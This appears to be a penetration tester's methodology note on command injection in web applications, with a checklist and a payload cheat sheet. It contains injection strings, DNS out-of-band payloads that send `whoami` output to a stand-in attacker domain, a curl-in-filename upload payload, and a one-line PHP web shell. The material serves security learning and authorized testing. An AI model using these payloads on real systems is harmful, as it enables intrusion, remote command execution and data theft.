---
title: "Command Injection"
layout: notes
tags:
  - webapp
  - methodology
  - command-injection
  - FI_http-headers
  - FI_parameters
  - FI_user-input
  - Co_privilege-escalation
  - Co_ssrf
  - Co_dos
  - Co_rce
---
## Summary

In legacy or poorly setup applications user input might be directly used to run scripts or commands. The functionality to read a file could be implemented as setting a variable to a parameter then running cat on the file. Determining the ability to inject commands is a simple fuzz away and this vulnerability can be leveraged to access other resources or even compromise production servers. 

## Methodology

When trying to look for Command Injection try/ask the following:
- [ ] **What is the backend doing for this functionality?**
	- [ ] think what OS and server software is performing tasks
- [ ] **Could this be a legacy feature?**
- [ ] **Is there any user input that could be a flag or option for a command?**
- [ ] try adding a command end character `;` and checking results
- [ ] try using a list of dangerous functions and methods based on framework
	- [ ] exec() in PHP, eval in Node.js etc.
- [ ] try escape characters and ping to fuzz for time based command injection
- [ ] try encoding or command splitting to bypass filters

IF COMMAND INJECTION IS FOUND  
- [ ] think about what this injection point has access to
- [ ] find a command with more impact or an exploit chain
- [ ] try nslookup with \`whoami\`.domain.com to test for OOB command injection

## Capabilities

RCE  
DoS  
Data Breach  
Privilege Escalation  

## Found In

Parameters  
User Input  
HTTP Headers  

## Tools/Examples

Try to end the previous statement and/or comment out the rest
```
; ls -al
; ls -al #
```

#### Escape Characters
General: `    &    &&    |    ||   $() `
Unix: `    ;    \n    0x0a    ${}    backticks    `

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |

#### nslookup

Can add commands to the start of DNS queries if others are blocked
```
nslookup `id`.domain.com
```

#### file uploads

```
`whoami`.pdf
`curl domain`.pdf
```

#### Quick Samples
```
& ping -c 10 127.0.0.1 &
&&ping -c 10 127.0.0.1&&
||ping -c 10 127.0.0.1||
|ping -c 10 127.0.0.1|
```

```
&whoami>/var/www/static/whoami.txt&
&&whoami>/var/www/static/whoami.txt&&
|whoami>/var/www/static/whoami.txt|
||whoami>/var/www/images/whoami.txt||
```

```
& nslookup kgji2ohoyw.web-attacker.com &
&& nslookup kgji2ohoyw.web-attacker.com &&
| nslookup kgji2ohoyw.web-attacker.com |
|| nslookup kgji2ohoyw.web-attacker.com ||

& nslookup `whoami`.web-attacker.com &
&& nslookup `whoami`.web-attacker.com &&
| nslookup `whoami`.web-attacker.com |
|| nslookup `whoami`.web-attacker.com ||
```

```
<?=`$_GET[0]`?>
```

